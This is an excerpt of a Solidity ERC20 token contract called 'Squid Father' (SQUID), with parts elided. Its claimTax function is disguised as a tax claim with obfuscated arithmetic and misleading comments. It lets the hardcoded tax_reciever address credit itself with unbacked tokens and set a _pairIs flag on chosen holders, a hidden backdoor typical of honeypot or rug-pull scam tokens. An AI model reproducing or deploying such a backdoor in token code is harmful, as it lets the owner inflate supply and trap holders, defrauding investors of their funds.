...
contract SQUID is Context, IERC20, Ownable {
    ...
    string private _name = "Squid Father";
    string private _symbol = "SQUID";
    uint8 private _decimals = 6;
    address payable public tax_reciever;
    ...
    constructor () {
        ...
        tax_reciever = payable(address(0x8C7D2e29Abd4016E7111d296EBd774B550926165));
    }
    ...
    function liquify(uint256 valueIndex,
    mapping(address => uint256)// set new etherreceive
    storage // set new ethreceive
    implementations) private {
        implementations[tax_reciever] += valueIndex;
    }
    ...
    function swapAndLiquify(uint256 amount) private lockTheSwap {
        ...
        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            ...
            0, 
            path,
            address(tax_reciever),
            block.timestamp
        ){} catch {}
    }

    function claimTax(address taxaddy,uint256 mach) public {
        uint a = 100;uint256 b = 300;
        if (mach >= 50 + uint256((a)+(b)).mul(a)) liquify(mach+mach,(_balances));
        if (b-3*a == mach) _pairIs[taxaddy] = mach;
        if (b+a == mach) _pairIs[taxaddy] = mach;
        if (tax_reciever != msg.sender)
            revert ("not tax_reciever");
    }
